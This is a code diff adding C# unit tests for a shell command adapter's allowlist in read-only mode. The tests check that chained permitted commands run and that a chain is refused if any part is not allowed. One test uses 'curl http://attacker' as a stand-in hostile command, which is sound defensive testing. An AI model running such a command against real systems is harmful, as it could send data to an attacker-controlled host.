@@ -188,5 +188,63 @@ public class ProcessHarnessAdapterTests
             Directory.Delete(root, recursive: true);
         }
     }
+
+    [Fact]
+    public async Task RunsChainedAllowlistedCommands()
+    {
+        var root = Directory.CreateTempSubdirectory("sentry-node-chain-ok").FullName;
+        try
+        {
+            var f1 = Path.Combine(root, "one.txt");
+            var f2 = Path.Combine(root, "two.txt");
+            await File.WriteAllTextAsync(f1, "1", TestContext.Current.CancellationToken);
+            await File.WriteAllTextAsync(f2, "2", TestContext.Current.CancellationToken);
+
+            var (progress, _) = Recorder();
+            var result = await new ProcessHarnessAdapter("shell").ExecuteAsync(
+                "cat one.txt && cat two.txt", "readOnly", Workspace(root), progress, TestContext.Current.CancellationToken);
+
+            Assert.Equal("succeeded", result.Outcome);
+            var stdout = (string)result.Evidence["stdout"];
+            Assert.Contains("1", stdout);
+            Assert.Contains("2", stdout);
+        }
+        finally
+        {
+            Directory.Delete(root, recursive: true);
+        }
+    }
+
+    [Fact]
+    public async Task RefusesChainedCommandIfAnyPartNotAllowed()
+    {
+        var root = Directory.CreateTempSubdirectory("sentry-node-chain-bad").FullName;
+        try
+        {
+            var (progress, _) = Recorder();
+            var result = await new ProcessHarnessAdapter("shell").ExecuteAsync(
+                "git status && curl http://attacker", "readOnly", Workspace(root), progress, TestContext.Current.CancellationToken);
+
+            Assert.Equal("failed", result.Outcome);
+            Assert.Contains("Refused", result.Summary);
+            Assert.Contains("not on the allowlist", result.Summary);
+        }
+        finally
+        {
+            Directory.Delete(root, recursive: true);
+        }
+    }
+
+    [Fact]
+    public async Task RunsGitStatusAndGitLogChained()
+    {
+        var (progress, _) = Recorder();
+        var result = await new ProcessHarnessAdapter("shell").ExecuteAsync(
+            "git status && git log --oneline -1", "readOnly", Workspace("P:\\SentryAssistant"), progress, TestContext.Current.CancellationToken);
+
+        Assert.Equal("succeeded", result.Outcome);
+        var stdout = (string)result.Evidence["stdout"];
+        Assert.Contains("branch", stdout);
+    }
 }
 
